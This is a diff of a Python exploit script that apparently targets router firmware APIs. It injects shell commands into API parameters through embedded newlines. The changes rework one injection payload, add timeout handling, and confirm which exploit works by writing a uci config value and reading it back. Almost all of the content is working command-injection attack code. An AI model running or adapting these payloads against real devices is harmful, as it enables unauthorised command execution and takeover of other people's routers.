@@ -44,13 +44,17 @@ def exploit_1(cmd, api = 'API/misystem/arn_switch'):
     cmd = cmd.replace(';', '\n')
     params = { 'open': 1, 'mode': 1, 'level': "\n" + cmd + "\n" }
     res = gw.api_request(api, params, resp = 'text')
+    time.sleep(0.5)
     return res
 
 def exploit_2(cmd, api = 'API/xqsystem/start_binding'):
     # vuln/exploit author: ?????????
     cmd = cmd.replace(';', '\n')
-    params = { 'uid': 1234, 'key': "1234'\n" + cmd + "\n'" }
-    res = gw.api_request(api, params, resp = 'text')
+    params = { 'uid': 1234, 'key': "1234' -X \n" + cmd + "\n logger -t X 'X" }
+    try:
+        res = gw.api_request(api, params, resp = 'text', timeout = 1.5)
+    except requests.exceptions.ReadTimeout:
+        res = ''
     return res
 
 
@@ -60,17 +64,13 @@ gw.set_diag_iperf_test_thr(20)
 vuln_test_num = 82000011
 exec_cmd = None
 exp_list = [ exploit_2, exploit_1 ]
-for exp_func in exp_list:
-    try:
-        res = exp_func(f"uci set diag.config.iperf_test_thr={vuln_test_num} ; uci commit diag")
-        #if '"code":0' not in res:
-        #    continue
-    except requests.exceptions.ReadTimeout:
-        time.sleep(1)
-        continue
-    time.sleep(0.5)
+for idx, exp_func in enumerate(exp_list):
+    exp_test_num = vuln_test_num + idx
+    res = exp_func(f"uci set diag.config.iperf_test_thr={exp_test_num} ; uci commit diag")
+    #if '"code":0' not in res:
+    #    continue
     iperf_test_thr = gw.get_diag_iperf_test_thr()
-    if iperf_test_thr == str(vuln_test_num):
+    if iperf_test_thr == str(exp_test_num):
         exec_cmd = exp_func
         break
     time.sleep(0.5)
